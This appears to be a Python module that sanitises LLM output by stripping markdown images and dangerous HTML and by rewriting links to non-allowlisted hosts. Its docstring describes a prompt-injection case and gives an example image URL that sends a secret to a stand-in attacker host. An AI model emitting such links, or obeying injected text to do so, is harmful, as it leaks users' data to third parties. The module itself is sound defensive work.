"""
LLM output sanitising (LLM05 improper output handling).

A prompt-injected model can emit `![x](https://attacker/?q=<secret>)` or an HTML <img>; any
client that renders markdown fetches that URL and leaks the data. `neutralise_markdown`:
  * removes markdown images (inline and reference style) and dangerous HTML tags
  * rewrites links to hosts outside the allowlist to plain text "label (host)"
Allowed targets: relative paths ("/x", "#frag"), the citation schemes (cite:, citation:, doc:),
and hosts listed in OUTPUT_LINK_ALLOWLIST (comma-separated; images additionally require
OUTPUT_IMAGE_ALLOWLIST, default empty).
"""

import os
import re
from typing import Iterable, Optional, Set
from urllib.parse import urlsplit

_SAFE_SCHEMES = ("cite:", "citation:", "doc:")
_IMG_INLINE = re.compile(r"!\[([^\]]*)\]\(\s*(<[^>]*>|[^)\s]*)[^)]*\)")
_IMG_REF = re.compile(r"!\[([^\]]*)\]\s*\[[^\]]*\]")
_LINK_INLINE = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*(<[^>]*>|[^)\s]*)[^)]*\)")
_REF_DEF = re.compile(r"^[ \t]{0,3}\[[^\]]+\]:\s*<?(\S+?)>?(?:\s+.*)?$", re.M)
_AUTOLINK = re.compile(r"<((?:https?|ftp|data|javascript):[^>\s]*)>", re.I)
_HTML_BLOCK = re.compile(r"<\s*(script|iframe|object|embed|style|svg|form|link|meta|base)\b[^>]*>.*?<\s*/\s*\1\s*>", re.I | re.S)
_HTML_TAG = re.compile(r"<\s*/?\s*(img|script|iframe|object|embed|style|svg|form|link|meta|base|video|audio|source|input)\b[^>]*>", re.I)
_HTML_ANCHOR = re.compile(r"<\s*a\b[^>]*href\s*=\s*[\"']?([^\"'\s>]*)[^>]*>(.*?)<\s*/\s*a\s*>", re.I | re.S)


def _hosts(env_name: str) -> Set[str]:
    return {h.strip().lower() for h in os.getenv(env_name, "").split(",") if h.strip()}


def _is_allowed(url: str, hosts: Set[str]) -> bool:
    u = url.strip().strip("<>").strip()
    low = u.lower()
    if not u:
        return False
    if low.startswith(_SAFE_SCHEMES):
        return True
    if u.startswith("#") or (u.startswith("/") and not u.startswith("//")):
        return True
    try:
        parts = urlsplit(u)
    except ValueError:
        return False
    if parts.scheme.lower() in ("http", "https") and parts.hostname and not parts.username:
        return parts.hostname.lower() in hosts
    return False


def _host_label(url: str) -> str:
    try:
        return urlsplit(url.strip().strip("<>").strip()).hostname or "link removed"
    except ValueError:
        return "link removed"


def neutralise_markdown(text: str, link_hosts: Optional[Iterable[str]] = None,
                        image_hosts: Optional[Iterable[str]] = None) -> str:
    if not text:
        return text
    lhosts = {h.lower() for h in link_hosts} if link_hosts is not None else _hosts("OUTPUT_LINK_ALLOWLIST")
    ihosts = {h.lower() for h in image_hosts} if image_hosts is not None else _hosts("OUTPUT_IMAGE_ALLOWLIST")

    def _img(m):
        return m.group(0) if _is_allowed(m.group(2), ihosts) else f"[image removed{': ' + m.group(1) if m.group(1) else ''}]"

    def _link(m):
        if _is_allowed(m.group(2), lhosts):
            return m.group(0)
        return f"{m.group(1)} ({_host_label(m.group(2))})"

    text = _HTML_BLOCK.sub("", text)
    text = _HTML_ANCHOR.sub(lambda m: m.group(0) if _is_allowed(m.group(1), lhosts) and "<" not in m.group(0)[1:2] else f"{m.group(2)} ({_host_label(m.group(1))})", text)
    text = _HTML_TAG.sub("", text)
    text = _IMG_INLINE.sub(_img, text)
    text = _IMG_REF.sub("[image removed]", text)
    text = _LINK_INLINE.sub(_link, text)
    text = _AUTOLINK.sub(lambda m: m.group(0) if _is_allowed(m.group(1), lhosts) else f"({_host_label(m.group(1))})", text)
    text = _REF_DEF.sub(lambda m: m.group(0) if _is_allowed(m.group(1), lhosts) else "", text)
    return text
